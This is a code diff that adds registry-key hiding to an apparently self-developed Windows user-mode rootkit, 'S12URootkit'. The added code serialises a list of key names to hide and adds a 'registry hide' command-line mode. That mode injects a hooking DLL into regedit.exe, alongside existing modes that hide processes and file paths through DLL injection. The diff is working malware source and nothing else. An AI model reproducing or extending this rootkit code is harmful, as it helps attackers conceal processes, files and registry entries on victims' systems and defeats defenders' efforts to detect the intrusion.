@@ -13,6 +13,8 @@ using namespace std;
 #define PROCESS_DLL "S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
 #define PROCESS_DLL_W L"S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
 #define PATH_DLL "S:\\MalwareDeveloped\\S12URootkit\\fileHooks\\x64\\Release\\fileHooks.dll"
+#define REGISTER_DLL "S:\\MalwareDeveloped\\S12URootkit\\registryHooks\\x64\\Release\\registryHooks.dll"
+
 
 int main(int argc, char* argv[]){        
     unordered_map<string, vector<string>> injectionMap;
@@ -28,9 +30,14 @@ int main(int argc, char* argv[]){
     wstring str2 = L"C:\\Users\\Public\\Music";
     pathsToHide.push_back(str2);
 
+    // Registry
+    vector<wstring> registryKeysToHide;
+    wstring str3 = L"hide";
+    registryKeysToHide.push_back(str3);
+
     serialitzator.serializeVectorWCharTPointer(processesToHide, L"processAgentMapped");
     serialitzator.serializeVectorWString(pathsToHide, L"pathMapped");
-    
+    serialitzator.serializeVectorWString(registryKeysToHide, L"registryMapped");
 
     // - rootkit.exe process hide processname.exe
     if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "hide") == 0) {
@@ -75,6 +82,26 @@ int main(int argc, char* argv[]){
     if (argc == 4 && strcmp(argv[1], "path") == 0 && strcmp(argv[2], "unhide") == 0) {
         // - rootkit.exe file unhide filename.exe
     }
+
+    // - rootkit.exe registry hide keyname
+    if (argc == 4 && strcmp(argv[1], "registry") == 0 && strcmp(argv[2], "hide") == 0) {
+		// - rootkit.exe registry hide keyname
+        vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"registryMapped");
+
+		// convert char* to wstring
+		char* key = argv[3];
+		wstring keyW(key, key + strlen(key));
+		deserializedStrings.push_back(keyW);
+		serialitzator.serializeVectorWString(deserializedStrings, L"registryMapped");
+		injectionMap["regedit.exe"] = { REGISTER_DLL };
+        injectDlls(injectionMap);
+    }
+
+    // - rootkit.exe registry unhide keyname
+    if (argc == 4 && strcmp(argv[1], "registry") == 0 && strcmp(argv[2], "unhide") == 0) {
+		// - rootkit.exe registry unhide keyname
+	}
+
     
 
     getchar();
